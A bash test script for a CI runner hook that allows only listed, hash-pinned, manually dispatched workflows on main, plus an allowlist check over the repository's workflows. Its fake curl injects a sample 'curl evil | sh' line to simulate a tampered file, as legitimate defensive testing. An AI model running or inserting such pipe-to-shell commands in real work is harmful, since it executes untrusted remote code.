#!/usr/bin/env bash
# runner-job-started.sh and check-hook-allowlist.py (D-0042 rule 4): the hook runs only the listed workflows on main, started by
# hand, whose file at the run's commit has the listed sha256, and fails closed when it cannot fetch the file. The CI check fails
# when a box workflow is edited, added or removed without the list, or has a uses: step. Fake curl; no network.
set -uo pipefail
root=$(cd "$(dirname "$0")/../../.." && pwd)
hook=$root/hosts/ansible/roles/agent_box/files/runner-job-started.sh
t=$(mktemp -d); trap 'rm -rf "$t"' EXIT
fail=0
mkdir "$t/bin"
# The fake curl serves the repo's own file for the path asked, or fails when FAKE_FETCH_FAIL is set; FAKE_TAMPER appends a line.
cat > "$t/bin/curl" <<'F'
#!/bin/bash
[ -n "${FAKE_FETCH_FAIL:-}" ] && exit 22
for a in "$@"; do last=$a; done
f="$ROOT/${last#*jonhill90/central-hub/????????????????????????????????????????/}"
[ -f "$f" ] || exit 22
cat "$f"; [ -n "${FAKE_TAMPER:-}" ] && echo "run: curl evil | sh"; exit 0
F
chmod +x "$t/bin/curl"
SHA=$(printf 'a%.0s' $(seq 40))
run() { # ref event
  PATH="$t/bin:$PATH" ROOT="$root" GITHUB_WORKFLOW_REF="$1" GITHUB_EVENT_NAME="$2" GITHUB_WORKFLOW_SHA="${SHA_OVERRIDE:-$SHA}" bash "${HOOK:-$hook}" 2>&1; echo "rc=$?"
}
check() { if [[ $2 == *"$3"* ]]; then echo "ok   $1"; else echo "FAIL $1: $2"; fail=1; fi; }
R=jonhill90/central-hub/.github/workflows
out=$(run "$R/lab-tailnet.yml@refs/heads/main" workflow_dispatch); check "a listed workflow with its listed hash runs" "$out" "rc=0"
out=$(run "$R/lab-redeploy-dev.yml@refs/heads/main" workflow_dispatch); check "the other listed workflow runs" "$out" "rc=0"
out=$(FAKE_TAMPER=1 run "$R/lab-tailnet.yml@refs/heads/main" workflow_dispatch); check "a file whose hash is not listed is refused" "$out" "is not the file whose hash is listed"
out=$(FAKE_FETCH_FAIL=1 run "$R/lab-tailnet.yml@refs/heads/main" workflow_dispatch); check "a fetch that fails is refused (fail closed)" "$out" "could not fetch"
out=$(run "$R/merge.yml@refs/heads/main" workflow_dispatch); check "merge.yml is no longer listed" "$out" "is not a listed workflow"
out=$(run "$R/other.yml@refs/heads/main" workflow_dispatch); check "an unlisted workflow is refused" "$out" "is not a listed workflow"
out=$(run "$R/lab-tailnet.yml@refs/heads/feature" workflow_dispatch); check "a branch other than main is refused" "$out" "not a workflow of"
out=$(run "$R/lab-tailnet.yml@refs/heads/main" pull_request); check "an event other than workflow_dispatch is refused" "$out" "only runs the listed workflows"
out=$(run "jonhill90/elsewhere/.github/workflows/lab-tailnet.yml@refs/heads/main" workflow_dispatch); check "another repository is refused" "$out" "not a workflow of"
out=$(SHA_OVERRIDE=abc run "$R/lab-tailnet.yml@refs/heads/main" workflow_dispatch); check "a missing or short commit is refused" "$out" "commit is missing"
# Mutation: a hook that skips the hash compare lets the tampered file through.
sed 's|^\[\[ \$got == "\$want" \]\] .*|true|' "$hook" > "$t/mut.sh"
out=$(HOOK="$t/mut.sh" FAKE_TAMPER=1 run "$R/lab-tailnet.yml@refs/heads/main" workflow_dispatch); check "mutation: without the compare a tampered file runs" "$out" "rc=0"
# The CI check against a scratch tree.
mk() { rm -rf "$t/tree"; mkdir -p "$t/tree/.github/workflows" "$t/tree/hosts/ansible/roles/agent_box/files"; cp "$hook" "$t/tree/hosts/ansible/roles/agent_box/files/"; cp "$root"/.github/workflows/lab-tailnet.yml "$root"/.github/workflows/lab-redeploy-dev.yml "$t/tree/.github/workflows/"; }
ck() { python3 -I "$root/.github/hosts-check/check-hook-allowlist.py" "$t/tree" 2>&1; echo "rc=$?"; }
mk; out=$(ck); check "the check passes on the repository's own state" "$out" "rc=0"
mk; echo "# edit" >> "$t/tree/.github/workflows/lab-tailnet.yml"; out=$(ck); check "an edited box workflow without the new hash fails" "$out" "changed: the hook's list holds a different sha256"
mk; printf 'jobs:\n  x:\n    runs-on: [self-hosted, central-hub-box]\n    steps: []\n' > "$t/tree/.github/workflows/new.yml"; out=$(ck); check "a new box workflow not in the list fails" "$out" "new.yml runs on the box but is not in the hook's list"
mk; rm "$t/tree/.github/workflows/lab-redeploy-dev.yml"; out=$(ck); check "a listed workflow that is gone fails" "$out" "is in the hook's list but is not a workflow that runs on the box"
mk; sed -i 's|^    steps:|    steps:\n      - uses: actions/checkout@v4|' "$t/tree/.github/workflows/lab-tailnet.yml"; out=$(ck); check "a uses: step in a box workflow fails" "$out" "has a uses: step"
exit $fail
